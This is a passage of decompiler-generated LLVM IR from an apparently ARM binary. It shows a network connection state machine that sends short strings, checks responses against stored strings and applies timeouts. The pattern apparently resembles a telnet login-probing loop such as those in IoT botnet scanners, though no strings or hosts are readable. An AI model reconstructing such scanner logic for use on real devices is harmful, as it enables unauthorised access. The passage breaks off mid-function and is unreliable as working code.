  store i32 %storemerge450, i32* @r4, align 4
  %v2_bbd8 = call i32 @function_1051c(i32* null)
  store i32 12, i32* %ip.global-to-local, align 4
  %v0_bbec = load i32, i32* @r4, align 4
  %v3_bbf0 = mul i32 %v0_bbec, 8
  store i32 %v3_bbf0, i32* %r2.global-to-local, align 4
  %v2_bbf8 = mul i32 %v0_bbec, 24
  %v2_bc00 = add i32 %v2_b720, %v2_bbf8
  %v2_bc04 = inttoptr i32 %v2_bc00 to i32*
  store i32 %v2_bbd8, i32* %v2_bc04, align 4
  br label %dec_label_pc_bc08

dec_label_pc_bc08:                                ; preds = %dec_label_pc_bba4, %dec_label_pc_bbd0
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_bc24 = add i32 %v2_b260, %v2_b208
  %v1_bc28 = inttoptr i32 %v2_bc24 to i32*
  %v2_bc28 = load i32, i32* %v1_bc28, align 4
  %v1_bc30 = call i32 @function_a43c(i32 %v2_bc28)
  %v2_bc38 = icmp eq i32 %v1_bc30, 0
  br i1 %v2_bc38, label %dec_label_pc_bc68, label %dec_label_pc_bc40

dec_label_pc_bc40:                                ; preds = %dec_label_pc_bc08
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  store i8 8, i8* %v1_b26c, align 8
  br label %dec_label_pc_bc68

dec_label_pc_bc68:                                ; preds = %dec_label_pc_bc08, %dec_label_pc_bc40
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v1_bc80 = inttoptr i32 %v2_b264 to i32*
  %v2_bc80 = load i32, i32* %v1_bc80, align 8
  store i32 %v2_bc80, i32* %ip.global-to-local, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_bca4 = load i32, i32* %v1_bc28, align 4
  store i32 %v2_bca4, i32* @lr, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_bcc4 = add i32 %v2_b260, %v2_bcc0
  %v1_bcc8 = inttoptr i32 %v2_bcc4 to i16*
  %v2_bcc8 = load i16, i16* %v1_bcc8, align 8
  %v3_bcc8 = zext i16 %v2_bcc8 to i32
  store i32 %v3_bcc8, i32* %r2.global-to-local, align 4
  %v1_bcd8 = load i32, i32* @sp, align 4
  %v2_bcd8 = inttoptr i32 %v1_bcd8 to i32*
  store i32 10000, i32* %v2_bcd8, align 4
  %v0_bcdc = load i32, i32* @lr, align 4
  %v1_bcdc = load i32, i32* @sp, align 4
  %v2_bcdc = add i32 %v1_bcdc, 4
  %v3_bcdc = inttoptr i32 %v2_bcdc to i32*
  store i32 %v0_bcdc, i32* %v3_bcdc, align 4
  %v1_bce4 = load i32, i32* @sp, align 4
  %v2_bce4 = add i32 %v1_bce4, 8
  %v3_bce4 = inttoptr i32 %v2_bce4 to i32*
  store i32 1024, i32* %v3_bce4, align 4
  %v0_bce8 = load i32, i32* %r2.global-to-local, align 4
  %v1_bce8 = load i32, i32* @sp, align 4
  %v2_bce8 = add i32 %v1_bce8, 12
  %v3_bce8 = inttoptr i32 %v2_bce8 to i32*
  store i32 %v0_bce8, i32* %v3_bce8, align 4
  %v0_bcec = load i32, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v5_bcfc = call i32 @function_a5b0(i32 %v0_bcec, i32 ptrtoint ([6 x i8]* @global_var_19e80.64 to i32), i32 0, i32 0)
  %v2_bd04 = icmp eq i32 %v5_bcfc, 0
  br i1 %v2_bd04, label %dec_label_pc_bdbc, label %dec_label_pc_bd0c

dec_label_pc_bd0c:                                ; preds = %dec_label_pc_bc68
  %v2_bd28 = add i32 %v2_b264, 12
  %v2_bd30 = inttoptr i32 %v2_bd28 to i32*
  store i32 0, i32* %v2_bd30, align 4
  %v2_bd50 = add i32 %v2_b264, 16
  %v3_bd58 = inttoptr i32 %v2_bd50 to i16*
  store i16 0, i16* %v3_bd58, align 8
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_bd7c = load i32, i32* %v1_bc28, align 4
  store i32 1024, i32* @r2, align 4
  %v2_bd8c = inttoptr i32 %v2_bd7c to i8*
  %v3_bd8c = call i32 @function_11f30(i8* %v2_bd8c, i32 0)
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  store i8 3, i8* %v1_b26c, align 8
  br label %dec_label_pc_cfc0

dec_label_pc_bdbc:                                ; preds = %dec_label_pc_bc68
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_bde0 = load i32, i32* %v1_bc28, align 4
  store i32 %v2_bde0, i32* @r0, align 4
  %v0_bde8 = call i32 @function_11fd0()
  store i32 16, i32* %ip.global-to-local, align 4
  %v2_be0c = mul i32 %storemerge450, 24
  %v2_be14 = add i32 %v2_bcc0, %v2_be0c
  %v1_be18 = trunc i32 %v0_bde8 to i16
  %v3_be18 = inttoptr i32 %v2_be14 to i16*
  store i16 %v1_be18, i16* %v3_be18, align 8
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_be3c = load i32, i32* %v1_bbc4, align 4
  %v1_be40 = add i32 %v2_be3c, 30
  store i32 %v1_be40, i32* @r4, align 4
  %v2_be48 = call i32 @function_1051c(i32* null)
  %v0_be50 = load i32, i32* @r4, align 4
  %v3_be50 = icmp ult i32 %v0_be50, %v2_be48
  br i1 %v3_be50, label %dec_label_pc_be58, label %dec_label_pc_cfc0

dec_label_pc_be58:                                ; preds = %dec_label_pc_bdbc
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_be70 = load i32, i32* %v1_bc80, align 8
  %v3_be78 = call i32 @function_b04c(i32 %v2_be70, i32 %v3_b14c, i32 %v3_b258)
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  %v3_bec8 = add i32 %v2_b264, 9
  %v4_bec8 = inttoptr i32 %v3_bec8 to i8*
  store i8 1, i8* %v4_bec8, align 1
  br label %dec_label_pc_cfc0

dec_label_pc_bed0:                                ; preds = %dec_label_pc_b24c
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v1_bee8 = inttoptr i32 %v2_b264 to i32*
  %v2_bee8 = load i32, i32* %v1_bee8, align 8
  store i32 %v2_bee8, i32* @r4, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v1_bf0c = add i32 %v2_b264, 10
  %v2_bf0c = inttoptr i32 %v1_bf0c to i8*
  %v3_bf0c = load i8, i8* %v2_bf0c, align 2
  %v4_bf0c = zext i8 %v3_bf0c to i32
  store i32 %v4_bf0c, i32* %r2.global-to-local, align 4
  %v4_bf18 = mul nuw nsw i32 %v4_bf0c, 4
  %v5_bf18 = add nuw nsw i32 %v4_bf18, 144448
  %v6_bf18 = inttoptr i32 %v5_bf18 to i32*
  %v7_bf18 = load i32, i32* %v6_bf18, align 4
  store i32 %v7_bf18, i32* @r5, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v3_bf3c = load i8, i8* %v2_bf0c, align 2
  %v4_bf3c = zext i8 %v3_bf3c to i32
  store i32 %v4_bf3c, i32* %r2.global-to-local, align 4
  %v4_bf48 = mul nuw nsw i32 %v4_bf3c, 4
  %v5_bf48 = add nuw nsw i32 %v4_bf48, 144448
  %v6_bf48 = inttoptr i32 %v5_bf48 to i32*
  %v7_bf48 = load i32, i32* %v6_bf48, align 4
  store i32 %v7_bf48, i32* @r0, align 4
  %v0_bf50 = call i32 @function_11fd0()
  %v0_bf58 = load i32, i32* @r4, align 4
  %v0_bf5c = load i32, i32* @r5, align 4
  store i32 %v0_bf50, i32* %r2.global-to-local, align 4
  %v4_bf68 = call i32 @function_127fc(i32 %v0_bf58, i32 %v0_bf5c, i32 %v0_bf50, i32 16384)
  %v1_bf70 = icmp slt i32 %v4_bf68, 0
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_bf90 = load i32, i32* %v1_bee8, align 8
  br i1 %v1_bf70, label %dec_label_pc_bf78, label %dec_label_pc_bff0

dec_label_pc_bf78:                                ; preds = %dec_label_pc_bed0
  %v3_bf98 = call i32 @function_b04c(i32 %v2_bf90, i32 %v3_b14c, i32 %v3_b258)
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  %v3_bfe8 = add i32 %v2_b264, 9
  %v4_bfe8 = inttoptr i32 %v3_bfe8 to i8*
  store i8 1, i8* %v4_bfe8, align 1
  br label %dec_label_pc_cfc0

dec_label_pc_bff0:                                ; preds = %dec_label_pc_bed0
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_c01c = call i32 @function_127fc(i32 %v2_bf90, i32 ptrtoint ([3 x i8]* @global_var_19e88.67 to i32), i32 2, i32 16384)
  %v1_c024 = icmp slt i32 %v5_c01c, 0
  br i1 %v1_c024, label %dec_label_pc_c02c, label %dec_label_pc_c0a4

dec_label_pc_c02c:                                ; preds = %dec_label_pc_bff0
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c044 = load i32, i32* %v1_bee8, align 8
  %v3_c04c = call i32 @function_b04c(i32 %v2_c044, i32 %v3_b14c, i32 %v3_b258)
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  %v3_c09c = add i32 %v2_b264, 9
  %v4_c09c = inttoptr i32 %v3_c09c to i8*
  store i8 1, i8* %v4_c09c, align 1
  br label %dec_label_pc_cfc0

dec_label_pc_c0a4:                                ; preds = %dec_label_pc_bff0
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  store i8 4, i8* %v1_b26c, align 8
  br label %dec_label_pc_cfc0

dec_label_pc_c0d0:                                ; preds = %dec_label_pc_b24c
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c0ec = add i32 %v2_b260, %v2_b720
  %v1_c0f0 = inttoptr i32 %v2_c0ec to i32*
  %v2_c0f0 = load i32, i32* %v1_c0f0, align 4
  %v2_c0f4 = icmp eq i32 %v2_c0f0, 0
  br i1 %v2_c0f4, label %dec_label_pc_c0fc, label %dec_label_pc_c134

dec_label_pc_c0fc:                                ; preds = %dec_label_pc_c0d0
  store i32 %storemerge450, i32* @r4, align 4
  %v2_c104 = call i32 @function_1051c(i32* null)
  store i32 12, i32* %ip.global-to-local, align 4
  %v0_c118 = load i32, i32* @r4, align 4
  %v3_c11c = mul i32 %v0_c118, 8
  store i32 %v3_c11c, i32* %r2.global-to-local, align 4
  %v2_c124 = mul i32 %v0_c118, 24
  %v2_c12c = add i32 %v2_b720, %v2_c124
  %v2_c130 = inttoptr i32 %v2_c12c to i32*
  store i32 %v2_c104, i32* %v2_c130, align 4
  br label %dec_label_pc_c134

dec_label_pc_c134:                                ; preds = %dec_label_pc_c0d0, %dec_label_pc_c0fc
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v1_c14c = inttoptr i32 %v2_b264 to i32*
  %v2_c14c = load i32, i32* %v1_c14c, align 8
  store i32 %v2_c14c, i32* %ip.global-to-local, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c16c = add i32 %v2_b260, %v2_b208
  %v1_c170 = inttoptr i32 %v2_c16c to i32*
  %v2_c170 = load i32, i32* %v1_c170, align 4
  store i32 %v2_c170, i32* @lr, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c190 = add i32 %v2_b260, %v2_bcc0
  %v1_c194 = inttoptr i32 %v2_c190 to i16*
  %v2_c194 = load i16, i16* %v1_c194, align 8
  %v3_c194 = zext i16 %v2_c194 to i32
  store i32 %v3_c194, i32* %r2.global-to-local, align 4
  %v1_c1a4 = load i32, i32* @sp, align 4
  %v2_c1a4 = inttoptr i32 %v1_c1a4 to i32*
  store i32 10000, i32* %v2_c1a4, align 4
  %v0_c1a8 = load i32, i32* @lr, align 4
  %v1_c1a8 = load i32, i32* @sp, align 4
  %v2_c1a8 = add i32 %v1_c1a8, 4
  %v3_c1a8 = inttoptr i32 %v2_c1a8 to i32*
  store i32 %v0_c1a8, i32* %v3_c1a8, align 4
  %v1_c1b0 = load i32, i32* @sp, align 4
  %v2_c1b0 = add i32 %v1_c1b0, 8
  %v3_c1b0 = inttoptr i32 %v2_c1b0 to i32*
  store i32 1024, i32* %v3_c1b0, align 4
  %v0_c1b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c1b4 = load i32, i32* @sp, align 4
  %v2_c1b4 = add i32 %v1_c1b4, 12
  %v3_c1b4 = inttoptr i32 %v2_c1b4 to i32*
  store i32 %v0_c1b4, i32* %v3_c1b4, align 4
  %v0_c1b8 = load i32, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_c1c8 = call i32 @function_a5b0(i32 %v0_c1b8, i32 ptrtoint ([9 x i8]* @global_var_19e8c.69 to i32), i32 1, i32 0)
  %v2_c1d0 = icmp eq i32 %v5_c1c8, 0
  br i1 %v2_c1d0, label %dec_label_pc_c2f0, label %dec_label_pc_c1d8

dec_label_pc_c1d8:                                ; preds = %dec_label_pc_c134
  %v2_c1f4 = add i32 %v2_b264, 12
  %v2_c1fc = inttoptr i32 %v2_c1f4 to i32*
  store i32 0, i32* %v2_c1fc, align 4
  %v2_c21c = add i32 %v2_b264, 16
  %v3_c224 = inttoptr i32 %v2_c21c to i16*
  store i16 0, i16* %v3_c224, align 8
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c248 = load i32, i32* %v1_c170, align 4
  %v4_c254 = call i32 @function_12060(i32 %v2_c248, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19e8c.69, i32 0, i32 0))
  %v2_c25c = icmp eq i32 %v4_c254, 0
  %. = select i1 %v2_c25c, i8 7, i8 5
  store i8 %., i8* %v1_b26c, align 8
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c2d8 = load i32, i32* %v1_c170, align 4
  store i32 1024, i32* @r2, align 4
  %v2_c2e8 = inttoptr i32 %v2_c2d8 to i8*
  %v3_c2e8 = call i32 @function_11f30(i8* %v2_c2e8, i32 0)
  br label %dec_label_pc_cfc0

dec_label_pc_c2f0:                                ; preds = %dec_label_pc_c134
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c30c = add i32 %v2_b264, 20
  %v1_c310 = inttoptr i32 %v2_c30c to i32*
  %v2_c310 = load i32, i32* %v1_c310, align 4
  %v4_c31c = call i32 @function_12060(i32 %v2_c310, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19e98.71, i32 0, i32 0))
  %v2_c324 = icmp eq i32 %v4_c31c, 0
  br i1 %v2_c324, label %dec_label_pc_c3a4, label %dec_label_pc_c32c

dec_label_pc_c32c:                                ; preds = %dec_label_pc_c2f0
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c344 = load i32, i32* %v1_c14c, align 8
  %v3_c34c = call i32 @function_b04c(i32 %v2_c344, i32 %v3_b14c, i32 %v3_b258)
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  %v3_c39c = add i32 %v2_b264, 9
  %v4_c39c = inttoptr i32 %v3_c39c to i8*
  store i8 0, i8* %v4_c39c, align 1
  br label %dec_label_pc_cfc0

dec_label_pc_c3a4:                                ; preds = %dec_label_pc_c2f0
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c3c8 = load i32, i32* %v1_c170, align 4
  store i32 %v2_c3c8, i32* @r0, align 4
  %v0_c3d0 = call i32 @function_11fd0()
  store i32 16, i32* %ip.global-to-local, align 4
  %v2_c3f4 = mul i32 %storemerge450, 24
  %v2_c3fc = add i32 %v2_bcc0, %v2_c3f4
  %v1_c400 = trunc i32 %v0_c3d0 to i16
  %v3_c400 = inttoptr i32 %v2_c3fc to i16*
  store i16 %v1_c400, i16* %v3_c400, align 8
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c424 = load i32, i32* %v1_c0f0, align 4
  %v1_c428 = add i32 %v2_c424, 30
  store i32 %v1_c428, i32* @r4, align 4
  %v2_c430 = call i32 @function_1051c(i32* null)
  %v0_c438 = load i32, i32* @r4, align 4
  %v3_c438 = icmp ult i32 %v0_c438, %v2_c430
  br i1 %v3_c438, label %dec_label_pc_c440, label %dec_label_pc_cfc0

dec_label_pc_c440:                                ; preds = %dec_label_pc_c3a4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c458 = load i32, i32* %v1_c14c, align 8
  %v3_c460 = call i32 @function_b04c(i32 %v2_c458, i32 %v3_b14c, i32 %v3_b258)
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  %v3_c4b0 = add i32 %v2_b264, 9
  %v4_c4b0 = inttoptr i32 %v3_c4b0 to i8*
  store i8 1, i8* %v4_c4b0, align 1
  br label %dec_label_pc_cfc0

dec_label_pc_c4b8:                                ; preds = %dec_label_pc_b24c
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v1_c4d0 = inttoptr i32 %v2_b264 to i32*
  %v2_c4d0 = load i32, i32* %v1_c4d0, align 8
  store i32 %v2_c4d0, i32* @r4, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v1_c4f4 = add i32 %v2_b264, 11
  %v2_c4f4 = inttoptr i32 %v1_c4f4 to i8*
  %v3_c4f4 = load i8, i8* %v2_c4f4, align 1
  %v4_c4f4 = zext i8 %v3_c4f4 to i32
  store i32 %v4_c4f4, i32* %r2.global-to-local, align 4
  %v4_c500 = mul nuw nsw i32 %v4_c4f4, 4
  %v5_c500 = add nuw nsw i32 %v4_c500, 144460
  %v6_c500 = inttoptr i32 %v5_c500 to i32*
  %v7_c500 = load i32, i32* %v6_c500, align 4
  store i32 %v7_c500, i32* @r5, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v3_c524 = load i8, i8* %v2_c4f4, align 1
  %v4_c524 = zext i8 %v3_c524 to i32
  store i32 %v4_c524, i32* %r2.global-to-local, align 4
  %v4_c530 = mul nuw nsw i32 %v4_c524, 4
  %v5_c530 = add nuw nsw i32 %v4_c530, 144460
  %v6_c530 = inttoptr i32 %v5_c530 to i32*
  %v7_c530 = load i32, i32* %v6_c530, align 4
  store i32 %v7_c530, i32* @r0, align 4
  %v0_c538 = call i32 @function_11fd0()
  %v0_c540 = load i32, i32* @r4, align 4
  %v0_c544 = load i32, i32* @r5, align 4
  store i32 %v0_c538, i32* %r2.global-to-local, align 4
  %v4_c550 = call i32 @function_127fc(i32 %v0_c540, i32 %v0_c544, i32 %v0_c538, i32 16384)
  %v1_c558 = icmp slt i32 %v4_c550, 0
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c578 = load i32, i32* %v1_c4d0, align 8
  br i1 %v1_c558, label %dec_label_pc_c560, label %dec_label_pc_c5d8

dec_label_pc_c560:                                ; preds = %dec_label_pc_c4b8
  %v3_c580 = call i32 @function_b04c(i32 %v2_c578, i32 %v3_b14c, i32 %v3_b258)
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  %v3_c5d0 = add i32 %v2_b264, 9
  %v4_c5d0 = inttoptr i32 %v3_c5d0 to i8*
  store i8 1, i8* %v4_c5d0, align 1
  br label %dec_label_pc_cfc0

dec_label_pc_c5d8:                                ; preds = %dec_label_pc_c4b8
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_c604 = call i32 @function_127fc(i32 %v2_c578, i32 ptrtoint ([3 x i8]* @global_var_19e88.67 to i32), i32 2, i32 16384)
  %v1_c60c = icmp slt i32 %v5_c604, 0
  br i1 %v1_c60c, label %dec_label_pc_c614, label %dec_label_pc_c68c

dec_label_pc_c614:                                ; preds = %dec_label_pc_c5d8
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c62c = load i32, i32* %v1_c4d0, align 8
  %v3_c634 = call i32 @function_b04c(i32 %v2_c62c, i32 %v3_b14c, i32 %v3_b258)
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  %v3_c684 = add i32 %v2_b264, 9
  %v4_c684 = inttoptr i32 %v3_c684 to i8*
  store i8 1, i8* %v4_c684, align 1
  br label %dec_label_pc_cfc0

dec_label_pc_c68c:                                ; preds = %dec_label_pc_c5d8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  store i8 6, i8* %v1_b26c, align 8
  br label %dec_label_pc_cfc0

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_b24c
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c6d4 = add i32 %v2_b260, %v2_b720
  %v1_c6d8 = inttoptr i32 %v2_c6d4 to i32*
  %v2_c6d8 = load i32, i32* %v1_c6d8, align 4
  %v2_c6dc = icmp eq i32 %v2_c6d8, 0
  br i1 %v2_c6dc, label %dec_label_pc_c6e4, label %dec_label_pc_c71c

dec_label_pc_c6e4:                                ; preds = %dec_label_pc_c6b8
  store i32 %storemerge450, i32* @r4, align 4
  %v2_c6ec = call i32 @function_1051c(i32* null)
  store i32 12, i32* %ip.global-to-local, align 4
  %v0_c700 = load i32, i32* @r4, align 4
  %v3_c704 = mul i32 %v0_c700, 8
  store i32 %v3_c704, i32* %r2.global-to-local, align 4
  %v2_c70c = mul i32 %v0_c700, 24
  %v2_c714 = add i32 %v2_b720, %v2_c70c
  %v2_c718 = inttoptr i32 %v2_c714 to i32*
  store i32 %v2_c6ec, i32* %v2_c718, align 4
  br label %dec_label_pc_c71c

dec_label_pc_c71c:                                ; preds = %dec_label_pc_c6b8, %dec_label_pc_c6e4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v1_c734 = inttoptr i32 %v2_b264 to i32*
  %v2_c734 = load i32, i32* %v1_c734, align 8
  store i32 %v2_c734, i32* %ip.global-to-local, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c754 = add i32 %v2_b260, %v2_b208
  %v1_c758 = inttoptr i32 %v2_c754 to i32*
  %v2_c758 = load i32, i32* %v1_c758, align 4
  store i32 %v2_c758, i32* @lr, align 4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c778 = add i32 %v2_b260, %v2_bcc0
  %v1_c77c = inttoptr i32 %v2_c778 to i16*
  %v2_c77c = load i16, i16* %v1_c77c, align 8
  %v3_c77c = zext i16 %v2_c77c to i32
  store i32 %v3_c77c, i32* %r2.global-to-local, align 4
  %v1_c78c = load i32, i32* @sp, align 4
  %v2_c78c = inttoptr i32 %v1_c78c to i32*
  store i32 10000, i32* %v2_c78c, align 4
  %v0_c790 = load i32, i32* @lr, align 4
  %v1_c790 = load i32, i32* @sp, align 4
  %v2_c790 = add i32 %v1_c790, 4
  %v3_c790 = inttoptr i32 %v2_c790 to i32*
  store i32 %v0_c790, i32* %v3_c790, align 4
  %v1_c798 = load i32, i32* @sp, align 4
  %v2_c798 = add i32 %v1_c798, 8
  %v3_c798 = inttoptr i32 %v2_c798 to i32*
  store i32 1024, i32* %v3_c798, align 4
  %v0_c79c = load i32, i32* %r2.global-to-local, align 4
  %v1_c79c = load i32, i32* @sp, align 4
  %v2_c79c = add i32 %v1_c79c, 12
  %v3_c79c = inttoptr i32 %v2_c79c to i32*
  store i32 %v0_c79c, i32* %v3_c79c, align 4
  %v0_c7a0 = load i32, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_c7b0 = call i32 @function_a5b0(i32 %v0_c7a0, i32 ptrtoint ([9 x i8]* @global_var_19e98.71 to i32), i32 1, i32 0)
  %v2_c7b8 = icmp eq i32 %v5_c7b0, 0
  br i1 %v2_c7b8, label %dec_label_pc_ca3c, label %dec_label_pc_c7c0

dec_label_pc_c7c0:                                ; preds = %dec_label_pc_c71c
  %v2_c7dc = add i32 %v2_b264, 12
  %v2_c7e4 = inttoptr i32 %v2_c7dc to i32*
  store i32 0, i32* %v2_c7e4, align 4
  %v2_c804 = add i32 %v2_b264, 16
  %v3_c80c = inttoptr i32 %v2_c804 to i16*
  store i16 0, i16* %v3_c80c, align 8
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c830 = load i32, i32* %v1_c758, align 4
  %v4_c83c = call i32 @function_12060(i32 %v2_c830, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19e98.71, i32 0, i32 0))
  %v2_c844 = icmp eq i32 %v4_c83c, 0
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c918 = load i32, i32* %v1_c758, align 4
  br i1 %v2_c844, label %dec_label_pc_c8f8, label %dec_label_pc_c84c

dec_label_pc_c84c:                                ; preds = %dec_label_pc_c7c0
  store i32 1024, i32* @r2, align 4
  %v2_c87c = inttoptr i32 %v2_c918 to i8*
  %v3_c87c = call i32 @function_11f30(i8* %v2_c87c, i32 0)
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c898 = load i32, i32* %v1_c734, align 8
  %v3_c8a0 = call i32 @function_b04c(i32 %v2_c898, i32 %v3_b14c, i32 %v3_b258)
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  %v3_c8f0 = add i32 %v2_b264, 9
  %v4_c8f0 = inttoptr i32 %v3_c8f0 to i8*
  store i8 0, i8* %v4_c8f0, align 1
  br label %dec_label_pc_cfc0

dec_label_pc_c8f8:                                ; preds = %dec_label_pc_c7c0
  %v1_c920 = call i32 @function_a43c(i32 %v2_c918)
  %v2_c928 = icmp eq i32 %v1_c920, 0
  br i1 %v2_c928, label %dec_label_pc_c930, label %dec_label_pc_c9dc

dec_label_pc_c930:                                ; preds = %dec_label_pc_c8f8
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c94c = add i32 %v2_b264, 20
  %v1_c950 = inttoptr i32 %v2_c94c to i32*
  %v2_c950 = load i32, i32* %v1_c950, align 4
  store i32 1024, i32* @r2, align 4
  %v2_c960 = inttoptr i32 %v2_c950 to i8*
  %v3_c960 = call i32 @function_11f30(i8* %v2_c960, i32 0)
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_c97c = load i32, i32* %v1_c734, align 8
  %v3_c984 = call i32 @function_b04c(i32 %v2_c97c, i32 %v3_b14c, i32 %v3_b258)
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  %v3_c9d4 = add i32 %v2_b264, 9
  %v4_c9d4 = inttoptr i32 %v3_c9d4 to i8*
  store i8 1, i8* %v4_c9d4, align 1
  br label %dec_label_pc_cfc0

dec_label_pc_c9dc:                                ; preds = %dec_label_pc_c8f8
  store i8 7, i8* %v1_b26c, align 8
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_ca24 = load i32, i32* %v1_c758, align 4
  store i32 1024, i32* @r2, align 4
  %v2_ca34 = inttoptr i32 %v2_ca24 to i8*
  %v3_ca34 = call i32 @function_11f30(i8* %v2_ca34, i32 0)
  br label %dec_label_pc_cfc0

dec_label_pc_ca3c:                                ; preds = %dec_label_pc_c71c
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_ca60 = load i32, i32* %v1_c758, align 4
  store i32 %v2_ca60, i32* @r0, align 4
  %v0_ca68 = call i32 @function_11fd0()
  store i32 16, i32* %ip.global-to-local, align 4
  %v2_ca8c = mul i32 %storemerge450, 24
  %v2_ca94 = add i32 %v2_bcc0, %v2_ca8c
  %v1_ca98 = trunc i32 %v0_ca68 to i16
  %v3_ca98 = inttoptr i32 %v2_ca94 to i16*
  store i16 %v1_ca98, i16* %v3_ca98, align 8
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_cabc = load i32, i32* %v1_c6d8, align 4
  %v1_cac0 = add i32 %v2_cabc, 30
  store i32 %v1_cac0, i32* @r4, align 4
  %v2_cac8 = call i32 @function_1051c(i32* null)
  %v0_cad0 = load i32, i32* @r4, align 4
  %v3_cad0 = icmp ult i32 %v0_cad0, %v2_cac8
  br i1 %v3_cad0, label %dec_label_pc_cad8, label %dec_label_pc_cfc0

dec_label_pc_cad8:                                ; preds = %dec_label_pc_ca3c
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_caf0 = load i32, i32* %v1_c734, align 8
  %v3_caf8 = call i32 @function_b04c(i32 %v2_caf0, i32 %v3_b14c, i32 %v3_b258)
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  %v3_cb48 = add i32 %v2_b264, 9
  %v4_cb48 = inttoptr i32 %v3_cb48 to i8*
  store i8 1, i8* %v4_cb48, align 1
  br label %dec_label_pc_cfc0

dec_label_pc_cb50:                                ; preds = %dec_label_pc_b24c
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v1_cb68 = inttoptr i32 %v2_b264 to i32*
  %v2_cb68 = load i32, i32* %v1_cb68, align 8
  store i32 %v2_cb68, i32* @r4, align 4
  %v2_cb70 = load i32, i32* inttoptr (i32 144500 to i32*), align 4
  store i32 %v2_cb70, i32* @r5, align 4
  %v2_cb78 = load i32, i32* inttoptr (i32 144500 to i32*), align 4
  store i32 %v2_cb78, i32* @r0, align 4
  %v0_cb80 = call i32 @function_11fd0()
  %v0_cb88 = load i32, i32* @r4, align 4
  %v0_cb8c = load i32, i32* @r5, align 4
  store i32 %v0_cb80, i32* %r2.global-to-local, align 4
  %v4_cb98 = call i32 @function_127fc(i32 %v0_cb88, i32 %v0_cb8c, i32 %v0_cb80, i32 16384)
  %v1_cba0 = icmp slt i32 %v4_cb98, 0
  br i1 %v1_cba0, label %dec_label_pc_cba8, label %bb41

dec_label_pc_cba8:                                ; preds = %dec_label_pc_cb50
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
